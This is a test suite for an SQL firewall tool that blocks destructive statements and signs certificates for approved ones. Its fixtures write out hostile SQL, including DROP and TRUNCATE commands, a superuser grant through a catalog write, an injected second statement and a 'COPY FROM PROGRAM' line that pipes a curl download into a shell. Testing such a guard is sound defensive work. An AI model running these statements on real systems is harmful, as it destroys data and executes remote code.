#!/usr/bin/env node
// Offline tests for the SQL execution-certificate firewall (src/tools/sql-guard.js
// + sql-guard-kit.js). A security tool that is wrong is worse than no tool: a
// false positive trains agents to ignore it, and a false negative is the
// production table it was supposed to save. Both directions are pinned here.
import { generateKeyPairSync } from "node:crypto";
import {
  analyzeSql, scrubSql, issueCertificate, verifyCertificate,
  SAMPLE_SQL, SAMPLE_CERTIFICATE, SAMPLE_PUBLIC_KEY,
} from "../src/tools/sql-guard.js";
import { SQL_GUARD_TOOLS } from "../src/tools/sql-guard-kit.js";

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log(`ok - ${m}`); } else { fail++; console.error(`FAIL - ${m}`); } };
const blocks = (sql, id) => {
  const a = analyzeSql(sql);
  ok(a.verdict === "block" && a.blocked.includes(id), `blocks ${id}: ${sql.slice(0, 52)}`);
};
const passes = (sql) => {
  const a = analyzeSql(sql);
  ok(a.verdict === "pass", `passes clean SQL: ${sql.slice(0, 52)} (got ${a.verdict} ${JSON.stringify(a.blocked)})`);
};

// ---- 1. the destructive shapes it exists to catch ----
blocks("DELETE FROM orders", "unbounded-delete");
blocks("UPDATE accounts SET balance = 0", "unbounded-update");
blocks("update accounts set balance = 0", "unbounded-update"); // case-insensitive
blocks("UPDATE t SET x = 1 WHERE 1=1", "tautological-where");
blocks("UPDATE t SET x = 1 WHERE TRUE", "tautological-where");
blocks("DROP TABLE customers", "drop-object");
blocks("DROP DATABASE prod", "drop-object");
blocks("TRUNCATE audit_log", "truncate");
blocks("ALTER TABLE users DROP COLUMN email", "drop-column");
blocks("COPY t FROM PROGRAM 'curl evil.sh | sh'", "copy-from-program");
blocks("GRANT ALL ON users TO app", "privilege-change");
blocks("CREATE ROLE intruder WITH SUPERUSER", "privilege-change");
blocks("SET session_replication_role = replica", "replication-role-bypass");
blocks("ALTER TABLE orders DISABLE TRIGGER ALL", "disable-trigger-or-constraint");
blocks("UPDATE pg_catalog.pg_authid SET rolsuper = true WHERE rolname = 'app'", "system-catalog-write");
blocks("UPDATE a SET b = 1 WHERE id = 2; DROP TABLE c", "multi-statement");
blocks("UPDATE t SET x = 1 WHERE name = 'unterminated", "unterminated-literal");

// ---- 2. false positives are the other failure mode ----
passes("SELECT * FROM users WHERE id = 1");
passes("UPDATE users SET plan = 'pro' WHERE id = 42");
passes("DELETE FROM sessions WHERE expires_at < now()");
passes("INSERT INTO log (msg) VALUES ('drop table users')");      // keyword inside a literal
passes("INSERT INTO log (msg) VALUES ('a; b')");                   // semicolon inside a literal
passes("UPDATE t SET x = 1 WHERE id = 2 -- migration 003");        // ordinary annotated SQL
passes("UPDATE t SET body = $$he said 'delete from t'$$ WHERE id = 1"); // dollar-quoted
passes("SELECT 'DROP TABLE x'");
{
  const a = analyzeSql("CREATE INDEX CONCURRENTLY idx_users_email ON users (email)");
  ok(a.verdict === "warn" && a.risks.some((r) => r.id === "ddl"), `plain DDL warns, never blocks (got ${a.verdict})`);
}

// ---- 3. scrubbing keeps the text index-aligned (statements must read true) ----
{
  const sql = "INSERT INTO log (msg) VALUES ('hello; world'); DELETE FROM t WHERE id = 1";
  const { scrubbed } = scrubSql(sql);
  ok(scrubbed.length === sql.length, "scrubbed text is index-aligned with the source");
  const a = analyzeSql(sql, { allowMultiStatement: true });
  ok(a.statements[0].statement === "INSERT INTO log (msg) VALUES ('hello; world')", "statement 1 reported verbatim");
  ok(a.statements[1].statement === "DELETE FROM t WHERE id = 1", "statement 2 reported verbatim");
  // comments are whitespace in postgres, so a comment-split keyword is not a DROP here either
  ok(analyzeSql("DR/**/OP TABLE users").verdict !== "block", "comment-split non-keyword is not treated as DROP");
  ok(analyzeSql("DROP/**/TABLE users").blocked.includes("drop-object"), "a real DROP with a comment inside is still caught");
}

// ---- 4. WITH ... UPDATE is a write wearing a read's hat ----
{
  const a = analyzeSql("WITH doomed AS (SELECT id FROM t) DELETE FROM t");
  ok(a.mutating && a.verdict === "block", `CTE-wrapped unbounded delete is caught (got ${a.verdict})`);
}

// ---- 5. policy: allow downgrades block -> warn, and is recorded ----
{
  const a = analyzeSql("TRUNCATE staging_import", { allow: ["truncate"] });
  ok(a.verdict === "warn" && a.risks[0].severity === "warn", "an allowed risk downgrades to warn");
  ok(a.policy.allow.includes("truncate"), "the effective policy is reported back");
  const b = analyzeSql("TRUNCATE staging_import");
  ok(b.verdict === "block", "the same statement blocks under the default policy");
}

// ---- 6. certificates bind a verdict to THIS statement ----
{
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const priv = privateKey.export({ type: "pkcs8", format: "pem" });
  const pub = publicKey.export({ type: "spki", format: "pem" });
  const sql = "UPDATE users SET plan = 'pro' WHERE id = 42";
  const a = analyzeSql(sql);
  const cert = issueCertificate(a, { privateKeyPem: priv, ttlSeconds: 300 });
  ok(verifyCertificate(sql, cert.token, { publicKeyPem: pub }).valid, "a fresh certificate verifies");
  ok(!verifyCertificate(sql + " ", cert.token, { publicKeyPem: pub }).valid, "one changed character invalidates it (hash binding)");
  ok(verifyCertificate("DELETE FROM users", cert.token, { publicKeyPem: pub }).reason.includes("different statement"), "a certificate cannot be reused for another statement");
  const other = generateKeyPairSync("ed25519").publicKey.export({ type: "spki", format: "pem" });
  ok(!verifyCertificate(sql, cert.token, { publicKeyPem: other }).valid, "another issuer's key does not verify it");
  ok(!verifyCertificate(sql, cert.token, { publicKeyPem: pub, now: Date.now() + 3_600_000 }).valid, "an expired certificate is rejected");
  // tamper: flip the verdict inside the payload and re-encode
  const [p] = cert.token.split(".");
  const tampered = Buffer.from(Buffer.from(p, "base64url").toString("utf8").replace('"pass"', '"warn"')).toString("base64url") + "." + cert.token.split(".")[1];
  ok(!verifyCertificate(sql, tampered, { publicKeyPem: pub }).valid, "a tampered payload fails the signature");
  for (const junk of ["", "not-a-token", "a.b", "....", "eyJhIjoxfQ"]) {
    const r = verifyCertificate(sql, junk, { publicKeyPem: pub });
    ok(r.valid === false && typeof r.reason === "string", `malformed token "${junk.slice(0, 8)}" returns a reason, never throws`);
  }
  ok(issueCertificate(a, { privateKeyPem: null }) === null, "no signing key means no certificate, never an unsigned one");
  const blocked = analyzeSql("DELETE FROM t");
  const bcert = issueCertificate(blocked, { privateKeyPem: priv });
  ok(!verifyCertificate("DELETE FROM t", bcert.token, { publicKeyPem: pub }).valid, "a certificate recording a non-pass verdict never verifies as permission");
}

// ---- 7. the committed sample verifies forever (the verify tool's example) ----
ok(verifyCertificate(SAMPLE_SQL, SAMPLE_CERTIFICATE, { publicKeyPem: SAMPLE_PUBLIC_KEY }).valid, "the committed sample certificate verifies");

// ---- 8. the tools answer their own examples (the catalogue's own bar) ----
for (const tool of SQL_GUARD_TOOLS) {
  const out = tool.handler(structuredClone(tool.discovery.input));
  ok(out && typeof out === "object", `${tool.slug} answers its documented example`);
}
{
  const guard = SQL_GUARD_TOOLS.find((t) => t.slug === "sql-guard");
  const out = guard.handler({ sql: "DELETE FROM users" });
  ok(out.verdict === "block" && out.certificate === null, "sql-guard issues no certificate for a blocked statement");
  let threw = null;
  try { guard.handler({ sql: "SELECT 1", allow: ["no-such-risk"] }); } catch (e) { threw = e; }
  ok(threw?.statusCode === 400, "an unknown risk id in allow is a self-explaining 400");
  try { guard.handler({}); } catch (e) { ok(e.statusCode === 400, "missing sql is a 400"); }
}


// 2026-08-28 review: a backslash is not an escape outside E'...' (standard_conforming_strings),
// and several write-shaped statements wore a read's hat.
{
  const a = analyzeSql("SELECT '\\'; DELETE FROM users; --'");
  ok(a.statementCount === 2 && a.mutating === true, "backslash inside a plain literal does not hide a second statement (2 statements, mutating)");
  const e = analyzeSql("SELECT E'it\\'s'");
  ok(e.statementCount === 1 && e.mutating === false, "a backslash escape inside an E'...' literal is still honoured");
  for (const q of ["EXPLAIN ANALYZE DELETE FROM t", "SELECT * INTO newt FROM t", "DO $$ BEGIN DELETE FROM t; END $$", "CALL f()", "WITH x AS (MERGE INTO t USING s ON 1=1 WHEN MATCHED THEN DELETE) SELECT 1"]) {
    ok(analyzeSql(q).mutating === true, `classified mutating: ${q.slice(0, 40)}`);
  }
  ok(analyzeSql("EXPLAIN SELECT 1").mutating === false && analyzeSql("SELECT 1").mutating === false, "plain reads stay reads");
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
